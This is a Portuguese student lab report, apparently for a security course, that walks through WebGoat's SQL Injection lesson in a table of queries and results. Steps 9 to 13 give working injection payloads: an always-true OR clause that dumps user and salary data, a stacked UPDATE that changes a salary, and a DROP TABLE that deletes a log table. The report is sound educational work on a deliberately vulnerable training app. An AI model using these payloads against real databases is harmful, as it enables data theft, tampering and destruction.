# Pergunta 1 - *Injection*

Todas as imagens e outros ficheiros considerados relevantes para o entendimento complementar da resolução a todas as questões encontram-se listados na secção de [**Notas/Observações Finais**](#notasobservações-finais).

1. [**Pergunta  1.1**](#) - ***SQL Injection***
	- Entendimento básico de como o *SQL* é/pode ser usado e para quê
	- Entendimento do que são *SQL Injections* e como funcionam

---

## Resolução da Pergunta 1

### Experiência 1.1 -*SQL Injection*

Através da *lesson* dada pelo WebGoat, conseguimos executar e consequentemente entender como funciona toda uma *SQL Injection*.

<br/>

**Com todo os passos resolvíveis feitos (começando-se no dois, conforma a *lesson* o indica) e compreendidos, detalham-se os mesmos na tabela que se segue:**

| Número do Passo | *Querie* Usada                                               | Funcionalidade                                               | Resultado                                                    |
| --------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **Passo 2**     | `select department from employees where userid = 96134`      | Seleciona o departamento do trabalhador cujo id é 96134.     | Marketing.                                                   |
| **Passo 3**     | `update employees set department = 'Sales' where first_name = 'Tobi Barnett'` | Altera o departamento de Toni Barnett para *Sales*.          | O departamento de Toni Barnett é atualizado com sucesso.     |
| **Passo 4**     | `alter table employees add phone varchar(20)`                | Adiciona a coluna *phone* à tabela de *employees*.           | A coluna *phone* é adicionada com sucesso.                   |
| **Passo 5**     | `GRANT ALTER TABLE TO 'UnauthorizedUser'`                    | Fornece permissões  ao *user group* "UnauthorizedUser" de alterar tabelas. | O acesso é concedido com sucesso.                            |
| **Passo 9**     | `SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'` | Cria uma consulta dinâmica através da concatenação de *strings*, tornando-a suscetível a uma *SQL Injection*. | A *SQL Injection* funcionará sempre dado que `'1' = '1'` é uma condição sempre verdadeira. Dessa forma, é devolvida todos os dados da `user_data`. |
| **Passo 10**    | `SELECT * From user_data WHERE Login_Count = 1 and userid = 1 or 1 = 1` | Cria uma consulta dinâmica através da concatenação de *strings*, tornando-a suscetível a uma *SQL Injection*. | Dado que o campo `userid` espera receber um número/inteiro, não existem as tais "plicas" à volta deste campo.  Dessa forma ao introduzir-se `1 or 1 = 1`, obtêm-se todos os dados da `user_data`. |
| **Passo 11**    | `' OR '1' = '1` no campo *Authentication TAN*                | Seleciona todos os *employees* que acabam por verificar aquele campo de *Authentication*. | *"You have succeeded!You have successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!"* <br />A informação obtida diz respeito até aos salários dos trabalhadores. |
| **Passo 12**    | `'; update employees set salary = 120000 where auth_tan = '3SL99A` | Altera o valor do salário para o John Smith cujo TAN é 3SL99A. | Com os primeiros caracteres termina-se a *query*.<br />Logo de seguida, encadeia-se uma outra que altera assim o valor do salário com sucesso. |
| **Passo 13**    | `';drop table access_log; select * from access_log where action ='` | Elimina a tabela `acess_log`.                                | *"Success! You successfully deleted the access_log table and that way compromised the availability of the data."*<br />Ou seja, toda a tabela em causa acaba por ser eliminada. |



---

## Notas/Observações Finais

Não existem observações finais para este Trabalho Prático.